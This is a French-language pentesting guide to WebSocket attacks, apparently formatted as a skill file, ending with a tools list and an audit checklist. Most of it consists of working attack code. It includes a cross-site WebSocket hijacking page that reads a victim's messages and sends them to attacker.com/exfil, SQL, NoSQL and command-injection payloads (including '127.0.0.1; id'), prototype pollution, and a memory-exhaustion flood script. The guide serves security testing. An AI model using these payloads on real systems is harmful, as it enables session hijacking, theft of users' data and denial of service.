---
name: websocket-attacks
description: Guide complet des attaques WebSocket — WS hijacking, cross-origin WS, CSRF via WS, injection, DoS, tools, et exploitation avancée
---

# WebSocket Attacks — Guide d'Exploitation Avancé

## Références principales
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WebSocket%20Attacks
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/websocket-attacks/
- **PortSwigger** : https://portswigger.net/web-security/websockets
- **OWASP WS CheatSheet** : https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html

---

## 1. Concepts fondamentaux

WebSocket (`ws://` ou `wss://`) établit une connexion bidirectionnelle persistante après handshake HTTP. Le handshake initial est vulnérable aux mêmes attaques que HTTP (CSRF, origin bypass, etc.).

### Handshake typique

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

---

## 2. Cross-Site WebSocket Hijacking (CSWSH)

### 2.1 Principe

Si le serveur WS **ne vérifie pas l'en-tête Origin**, n'importe quel site peut ouvrir une connexion WebSocket vers le serveur. Combiné avec les cookies d'authentification de l'utilisateur → hijacking de session.

### 2.2 Exploitation

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Le navigateur envoie automatiquement les cookies
const ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
  // Envoyer une requête de vol de données
  ws.send(JSON.stringify({
    action: 'get_messages',
    user: 'admin'
  }));
};

ws.onmessage = function(event) {
  // Exfiltrer les messages vers l'attaquant
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    mode: 'no-cors',
    body: event.data
  });
};
</script>
</body>
</html>
```

### 2.3 Détection

```bash
# Vérifier si le handshake WS est protégé
curl -s -i -X GET \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: https://attacker.com" \
  https://target.com/chat

# Si 101 Switching Protocols → Origin non vérifié
```

---

## 3. WebSocket Injection

### 3.1 SQL Injection via WS

```javascript
// Payload SQLi via message WS
ws.send('{"query": "users", "filter": "1\' OR \'1\'=\'1"}');
```

### 3.2 NoSQL Injection via WS

```javascript
ws.send(JSON.stringify({
  action: "login",
  username: "admin",
  password: {"$ne": ""}
}));
```

### 3.3 Command Injection via WS

```javascript
ws.send(JSON.stringify({
  action: "ping",
  host: "127.0.0.1; id"
}));
```

### 3.4 Prototype Pollution via WS

```javascript
ws.send(JSON.stringify({
  "__proto__": {"isAdmin": true},
  "username": "attacker"
}));
```

---

## 4. Cross-Origin WebSocket DoS

### 4.1 Memory Exhaustion

```javascript
// Envoyer des messages massifs
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  setInterval(() => {
    ws.send('A'.repeat(1024 * 1024)); // 1MB par message
  }, 1);
};
```

### 4.2 Slow Lorry (Slow WS)

```javascript
// Envoyer des fragments minuscules lentement
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  // Un seul gros message envoyé byte par byte
  ws.send('A');  // attendre 30s
  ws.send('B');  // attendre 30s
};
```

---

## 5. Man-in-the-Middle WS (ws:// non chiffré)

```bash
# Si wss:// n'est pas utilisé, le trafic est en clair
# Interception avec mitmproxy
mitmproxy --listen-port 8080
# Configurer le proxy dans le navigateur ou le système

# Avec tcpdump
tcpdump -i eth0 port 80 -A | grep -i "websocket\|sec-websocket"
```

---

## 6. WebSocket Smuggling

### 6.1 WS via Reverse Proxy

```http
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: xxx

GET /admin HTTP/1.1  # ← Requête smuggled sur la même connexion
Host: internal
```

### 6.2 HTTP/2 WebSocket Downgrade

Transition HTTP/2 → WS sans vérification de l'Origin.

---

## 7. Authentication Bypass

### 7.1 Session pas vérifiée au handshake

```javascript
// Le serveur vérifie l'auth au premier message, pas au handshake
const ws = new WebSocket('wss://target.com/api/ws');
ws.onopen = () => {
  // Envoyer un message sans session
  ws.send(JSON.stringify({action: "get_admin_data"}));
};
```

### 7.2 Token dans l'URL

```javascript
// Token dans query string (loggé par les proxies)
const ws = new WebSocket('wss://target.com/ws?token=SECRET');
```

---

## 8. Outils

```bash
# wscat — Client WS CLI
npm install -g wscat
wscat -c wss://target.com/ws -H "Cookie: session=abc"

# websocat — Alternative Rust
cargo install websocat
websocat -H "Origin: https://attacker.com" wss://target.com/ws

# Burp Suite — WebSocket history
# Proxy → WebSockets history

# wsrepl — WS exploitation tool
pip install wsrepl
wsrepl -u wss://target.com/ws --cookie "session=abc"
```

---

## 9. Checklist

```
HANDSHAKE
☐ Origin est-il vérifié ? (test avec origin attaquant)
☐ Cookies de session envoyés automatiquement ?
☐ Token d'authentification dans l'URL (loggé) ?
☐ Handshake nécessite-t-il une auth préalable ?
☐ Rate limiting sur l'établissement de connexion ?

CROSS-SITE
☐ CSWSH — cross-site WebSocket hijacking ?
☐ iframe + WS depuis domaine attaquant ?
☐ CORS nécessaire ou vérifié ?
☐ SameSite cookies = Lax/Strict ?

INJECTION
☐ SQLi / NoSQLi via messages WS ?
☐ Command injection ?
☐ Prototype pollution via JSON ?
☐ XML injection / XXE ?
☐ SSTI via WS messages ?

SÉCURITÉ GÉNÉRALE
☐ wss:// (TLS) utilisé ? (pas ws://)
☐ Messages chiffrés de bout en bout ?
☐ Rate limiting sur les messages ?
☐ Validation de taille des messages ?
☐ Timeout de connexion inactif ?
☐ Broadcast des messages à tous les clients ?
```